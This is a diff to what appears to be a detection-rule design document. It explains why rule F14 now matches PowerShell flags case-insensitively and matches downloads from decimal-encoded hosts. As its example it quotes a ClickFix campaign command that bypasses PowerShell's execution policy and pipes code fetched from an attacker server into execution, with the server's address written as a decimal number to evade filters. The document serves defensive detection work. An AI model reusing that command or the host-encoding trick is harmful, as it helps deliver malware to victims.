@@ -354,3 +354,24 @@ changes per page and an allow-listed block is a place to hide.
 
 **Limits.** A loader that reaches the function only as `["hasDemoPage"]`
 would not match; its `getDemoPage` ABI and contract addresses would.
+
+---
+
+## F14 ignores case and knows two command shapes
+
+**Decision.** F14's strong terms are matched case-insensitively, and two
+shapes count as strong: PowerShell followed by a flag, however the
+executable is quoted, and a download from a host written as a single
+8-to-10-digit decimal number, where the number ends the host.
+
+**Why.** The ChatGPT Custom GPT ClickFix campaign (Huntress, September
+2026) told victims to paste `"...\PowerShell.exe" -ExecutionPolicy Bypass
+"irm 1614733393/12 | ..."`. Planted on a page with no lure words around
+it, that raised nothing: the list said `powershell -` in lowercase, and
+the command's next character is a quote. `1614733393` is 96.62.224.81
+written to slip past dotted-address filters.
+
+**Rejected.** *The campaign's address or its decimal form as indicators.*
+It is a download server, and `1614733393` is also a Unix time that version
+strings carry.
+
